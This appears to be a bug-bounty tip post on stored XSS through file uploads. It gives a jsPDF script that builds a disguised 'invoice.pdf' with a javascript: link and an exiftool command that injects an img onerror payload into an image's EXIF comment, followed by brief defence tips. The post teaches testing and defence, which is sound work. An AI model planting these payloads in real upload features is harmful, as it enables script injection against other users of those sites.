## 📁 File Upload XSS – Beyond SVGs
![File Upload XSS – Beyond SVGs - Cybersecplayground](https://github.com/user-attachments/assets/e06b2791-3a63-43d6-aa53-b34343a06c09)

Attackers are getting creative by going beyond basic payloads. Here's how to achieve stored XSS using PDF and image metadata 👇

---

### 🔹 1. PDF with Embedded JavaScript

You can embed a malicious link inside a PDF and trigger XSS in certain PDF viewers like **Foxit Reader** or **older Adobe Reader** versions:

```javascript
// Create a PDF that triggers XSS on open
var doc = new jsPDF();
doc.text(20, 20, 'Legit Document');
doc.addPage();
doc.addLink(0, 0, 100, 100, "javascript:alert(document.domain)");
doc.save('invoice.pdf');
```

📄 **Upload** this crafted PDF to features like resume uploads or document verification portals.

> ⚠️ **Test in offline environments first.** Modern browsers/viewers block this, but older clients may still be vulnerable.

---

### 🔹 2. XSS via EXIF Metadata (Image Upload Bypass)

Target applications that read and render image metadata without sanitizing it.

**💣 Payload Example:**

```bash
exiftool -Comment='"><img src=x onerror=alert(1)>' innocent.jpg
```

Then upload the image.

✅ If the platform displays **EXIF comments** in a gallery or report → XSS triggered.

---

### 🔐 Defense Tips:

* 🛡 Sanitize metadata and user-supplied EXIF fields
* 🛡 Disallow `javascript:` links in PDFs
* 🛡 Strip scripts from uploaded documents and images

---

💡 Keep exploring file upload abuse techniques – many web apps **blindly trust file metadata and document structure**.

🛰 Follow us at **[@cybersecplayground](https://t.me/cybersecplayground)** for advanced bug bounty tips, bypasses, and CVE tactics.

---

\#bugbounty #xss #fileupload #infosec #cybersecplayground #javascript #exifxss #pentest
